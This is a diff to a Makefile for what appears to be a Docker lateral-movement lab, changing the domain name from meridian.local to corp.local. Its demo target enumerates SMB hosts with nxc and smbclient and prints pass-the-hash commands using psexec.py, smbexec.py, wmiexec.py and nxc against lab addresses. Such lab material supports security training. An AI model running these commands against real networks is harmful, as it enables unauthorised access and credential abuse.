@@ -16,7 +16,7 @@ shell:
 demo:       ## Enumerate hosts and demonstrate lateral movement
 	@echo "=== Waiting for network... ==="
 	docker compose exec attacker sh -c \
-	    'until nc -z dc01.meridian.local 389 2>/dev/null; do sleep 2; done; echo "DC ready."'
+	    'until nc -z dc01.corp.local 389 2>/dev/null; do sleep 2; done; echo "DC ready."'
 	@echo ""
 	@echo "=== 1. Enumerate live SMB hosts and check signing status ==="
 	docker compose exec attacker nxc smb 10.10.0.0/24 2>/dev/null \
@@ -31,9 +31,9 @@ demo:       ## Enumerate hosts and demonstrate lateral movement
 	docker compose exec attacker smbclient -L 10.10.0.101 -N 2>/dev/null | grep -v "^$" || true
 	@echo ""
 	@echo "=== Lateral movement commands to run interactively (make shell) ==="
-	@echo "  psexec.py   -hashes :HASH MERIDIAN.LOCAL/tallen@10.10.0.101"
-	@echo "  smbexec.py  -hashes :HASH MERIDIAN.LOCAL/tallen@10.10.0.102"
-	@echo "  wmiexec.py  -hashes :HASH MERIDIAN.LOCAL/tallen@10.10.0.101"
+	@echo "  psexec.py   -hashes :HASH CORP.LOCAL/tallen@10.10.0.101"
+	@echo "  smbexec.py  -hashes :HASH CORP.LOCAL/tallen@10.10.0.102"
+	@echo "  wmiexec.py  -hashes :HASH CORP.LOCAL/tallen@10.10.0.101"
 	@echo "  nxc smb 10.10.0.0/24 -u tallen -H :HASH"
 	@echo ""
 	@echo "=== Demo complete. Run 'make shell' to explore interactively. ==="
